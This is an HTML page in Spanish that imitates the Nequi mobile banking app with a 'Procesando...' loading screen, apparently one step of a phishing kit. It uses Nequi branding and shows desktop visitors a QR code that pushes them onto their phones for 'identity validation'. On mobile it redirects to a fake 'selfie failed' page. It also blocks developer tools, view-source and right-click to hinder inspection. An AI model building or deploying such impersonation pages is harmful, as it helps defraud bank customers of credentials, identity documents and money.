<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Procesando...</title>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Manrope', -apple-system, BlinkMacSystemFont, sans-serif;
    -webkit-tap-highlight-color: transparent;
  }

  body {
    background-color: #ffffff;
    color: #200020;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
  }

  .app-container {
    width: 100%;
    max-width: 420px;
    height: 100vh;
    max-height: 900px;
    padding: 40px 24px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    align-items: center;
    position: relative;
    background: #ffffff;
  }

  /* Logo Header */
  .header {
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
  }

  .header img {
    height: 36px;
    object-fit: contain;
  }

  .logo-fallback {
    display: flex;
    align-items: center;
    font-size: 32px;
    font-weight: 800;
    color: #20002b;
    letter-spacing: -1px;
  }

  .logo-fallback::before {
    content: '';
    display: inline-block;
    width: 9px;
    height: 9px;
    background-color: #e6007e;
    margin-right: 4px;
    align-self: flex-start;
    margin-top: 6px;
  }

  /* Contenido central (Spinner y texto Procesando...) */
  .center-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 24px;
    margin: auto;
  }

  /* Círculo giratorio de carga estilo Nequi */
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid #fce7f3; /* Rosa muy claro de fondo */
    border-top: 4px solid #e6007e; /* Color fucsia Nequi activo */
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  /* Texto Procesando... */
  .processing-text {
    font-size: 20px;
    font-weight: 700;
    color: #1e002c;
    letter-spacing: -0.2px;
  }

  /* Espaciador inferior invisible para mantener simetría vertical exacta */
  .footer-spacer {
    height: 36px;
  }

  /* Pantalla de bloqueo para PC con Código QR */
  #desktop-blocker {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #ffffff;
    z-index: 99999;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
    padding: 90px;
    text-align: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  .desktop-logo {
    height: 60px;
    object-fit: contain;
    margin-bottom: 28px;
  }

  .qr-container {
    background: #ffffff;
    padding: 20px;
    border-radius: 20px;
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
    border: 1px solid #f0f0f5;
    margin-bottom: 24px;
  }

  .qr-container img {
    width: 220px;
    height: 220px;
    object-fit: contain;
    display: block;
  }

  .desktop-title {
    font-size: 22px;
    font-weight: 800;
    color: #1e002c;
    margin-bottom: 10px;
  }

  /* Ancho corregido a 380px para que las líneas tengan el ancho idéntico a la otra pantalla */
  .desktop-desc {
    font-size: 15px;
    color: #625768;
    max-width: 380px;
    line-height: 1.4;
    font-weight: 500;
    margin: 0 auto;
  }
</style>
</head>
<body>

  <!-- Pantalla exclusiva para PC con Logo grande y Código QR -->
  <div id="desktop-blocker">
    <img class="desktop-logo" src="../NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
    <div class="qr-container">
      <img src="../NequiArchivos/codigo_qr.png" alt="Escanea el código QR">
    </div>
    <div class="desktop-title">Escanea el código QR</div>
    <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
  </div>

  <div class="app-container">
    
    <!-- Header -->
    <div class="header">
      <img src="vOLtQz8.png" alt="Nequi" onerror="this.style.display='none'; document.getElementById('alt-logo').style.display='flex';">
      <div id="alt-logo" class="logo-fallback" style="display: none;">Nequi</div>
    </div>

    <!-- Contenido central -->
    <div class="center-content">
      <div class="spinner"></div>
      <div class="processing-text">Procesando...</div>
    </div>

    <!-- Espaciador para equilibrar el diseño con el header -->
    <div class="footer-spacer"></div>

  </div>

  <script>
    // Comprobar si el acceso es desde un PC
    function checkDevice() {
      const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
      if (isDesktop) {
        document.getElementById('desktop-blocker').style.display = 'flex';
      } else {
        // Redirige automáticamente después de 4 segundos solo si es un dispositivo móvil
        setTimeout(() => {
          window.location.href = 'error_selfie_3_intentos.html';
        }, 4000);
      }
    }

    window.addEventListener('DOMContentLoaded', checkDevice);

    // --- Bloqueo estricto de inspección y atajos de teclado ---
    document.addEventListener('keydown', function(e) {
        // Bloquear F12
        if (e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + Shift + I o J (Inspeccionar / Consola)
        if (e.ctrlKey && e.shiftKey && (e.key.toUpperCase() === 'I' || e.key.toUpperCase() === 'J')) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + U (Ver código fuente)
        if (e.ctrlKey && e.key.toUpperCase() === 'U') {
            e.preventDefault();
            return false;
        }
    });

    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    }, false);
  </script>

</body>
</html>
